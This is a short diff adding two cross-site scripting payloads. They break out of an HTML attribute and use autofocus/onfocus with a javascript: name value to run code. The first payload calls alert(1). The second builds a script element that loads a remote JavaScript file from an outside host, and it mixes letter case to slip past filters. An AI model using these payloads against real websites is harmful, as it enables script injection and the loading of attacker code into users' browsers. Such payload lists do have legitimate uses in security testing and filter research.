@@ -1,0 +1,3 @@
+" name=javasCript:alert%281%29 autofocus onfocus=location=this.name xx
+
+" name=javasCript:s=document.createElement%28"sCript"%29;s.src="//xxxxx.js";document.body.appendChild%28s%29 
